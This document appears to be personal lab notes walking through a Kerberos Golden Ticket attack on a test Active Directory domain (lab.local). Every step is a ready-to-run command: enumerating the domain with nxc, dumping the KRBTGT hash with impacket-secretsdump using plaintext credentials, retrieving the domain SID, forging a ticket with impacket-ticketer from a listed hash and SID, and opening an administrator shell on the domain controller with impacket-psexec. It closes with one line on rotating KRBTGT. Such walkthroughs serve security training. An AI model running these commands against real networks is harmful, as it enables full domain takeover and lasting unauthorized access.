# Golden Ticket Attack

## Requirements

To create a Golden Ticket, we need three main pieces of information:

1. Domain name
2. `KRBTGT` NT hash
3. Domain SID

---

## 1. Get the Domain Name

We can use `nxc` to identify the domain:

```
nxc smb 192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003434.png)

---

## 2. Get the `KRBTGT` Hash

We can use `impacket-secretsdump` to extract the `KRBTGT` hash:

```
impacket-secretsdump user1:'12345l**'@192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003720.png)

---

## 3. Get the Domain SID

We can use `impacket-lookupsid` to retrieve the domain SID.

We can also use **WADComs** as a reference for Windows/Active Directory tools and their usage. It is similar to GTFOBins, but focused on Windows.

![](../../../../Images/Pasted%20image%2020260929003914.png)

Retrieve the SID:

```
impacket-lookupsid lab.local/user1:'12345l**'@192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003958.png)

---

## 4. Create the Golden Ticket

We can create the ticket using `impacket-ticketer`:

```
impacket-ticketer -nthash 185bb88d43e59ba0a02661fca3471554 -domain-sid S-1-5-21-3636623485-1569682949-312350125 -domain lab.local -dc-ip 192.168.227.139 administrator
```

![](../../../../Images/Pasted%20image%2020260929004049.png)

Important parameters:

```
-nthash      → KRBTGT NT hash
-domain-sid  → Domain SID
-domain      → Domain name
```

The command generates a `.ccache` Kerberos ticket.

---

## 5. Export the Ticket

Set the generated ticket as the Kerberos credential cache:

```
export KRB5CCNAME=administrator.ccache
```

`administrator.ccache` is the ticket generated by `impacket-ticketer`.

![](../../../../Images/Pasted%20image%2020260929004345.png)

---

## 6. Authenticate Using the Ticket

We can now use an Impacket tool such as `psexec` or `wmiexec` with the Kerberos ticket:

```
impacket-psexec -k -no-pass -dc-ip 192.168.227.139 lab.local/Administrator@DC-1.lab.local
```

![](../../../../Images/Pasted%20image%2020260929004457.png)

`DC-1` is the hostname of the Domain Controller, which can be identified using the SMB enumeration performed earlier.

The important options are:

```
-k        → Use Kerberos authentication
-no-pass  → Do not ask for a password
```

We successfully authenticated using the forged Golden Ticket without providing the Administrator's password.

A Golden Ticket is based on the `KRBTGT` secret, so changing the Administrator's password alone does not invalidate an already forged Golden Ticket. Rotating the `KRBTGT` account credentials is required to invalidate forged tickets.
